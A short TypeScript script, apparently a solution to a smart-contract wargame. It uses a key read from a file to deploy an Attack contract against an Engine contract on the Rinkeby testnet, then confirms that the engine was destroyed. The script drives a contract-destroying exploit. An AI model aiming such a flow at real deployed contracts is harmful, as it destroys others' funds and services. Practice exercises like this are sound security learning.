import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory } from '../types/ethers-contracts';
import { Engine__factory } from '../types/ethers-contracts/factories/Engine__factory';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x29d87cFacae9bCb54Cd90e9a238e6D1DC1869E53"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  const e = Engine__factory.connect(addr, provider).connect(alice);
  (new Attack__factory(alice)).deploy(addr).then(async attacker => {
    await attacker.attack();
    e.horsePower().catch(_e => {
      console.log("engine destoryed successfully.")
    })
  })


}

main().catch(e => {
  console.log("Error: " + e)
})
